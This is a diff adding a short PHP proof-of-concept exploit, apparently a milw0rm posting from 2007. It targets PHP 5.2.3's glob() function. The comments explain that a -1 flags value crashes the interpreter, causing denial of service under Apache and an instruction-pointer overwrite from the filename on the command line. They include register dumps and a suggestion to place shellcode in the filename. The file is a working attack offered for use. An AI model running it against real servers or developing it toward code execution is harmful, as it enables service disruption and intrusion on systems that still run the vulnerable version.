@@ -1,0 +1,36 @@
+<?php
+//PHP 5.2.3 glob() Remote DoS Exploit
+//author: shinnai
+//mail: shinnai[at]autistici[dot]org
+//site: http://shinnai.altervista.org
+
+//Tested on xp sp2, worked both from the cli (EIP overwrite) and on apache (Denial of Service)
+
+//Bug discovered with "Footzo" (thanks to rgod).
+
+//To download Footzo:
+//original link: http://godr.altervista.org/index.php?mod=Download/useful_tools#footzo.rar
+//alternative: http://www.shinnai.altervista.org/index.php?mod=Download/Utilities#footzo.rar
+
+//as you know, glob function expects an integer value passed to "[int $flags] " parameter
+//so when you give it something not integer (like -1) a funny thing happens:
+//I never seen something like that, EIP is overwrite with 4 bytes of filename :D
+//if you save aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb.php under C:\ and launch it
+//registers content will appear as follow:
+
+//EAX 00C0F8EC
+//ECX 00C0E9FC ASCII "C:\\aaaa"
+//EDX 00C0EC1C
+//EBX 00C0EC64 UNICODE "C:\\aaaa"
+//ESP 00C0E9F0
+//EBP 00000000
+//ESI 00C0F8EC
+//EDI 00C0EC74
+//EIP 62626262
+
+//any idea? put shellcode in filename :D
+
+glob("a",-1);
+?>
+
+# milw0rm.com [2007-07-14]
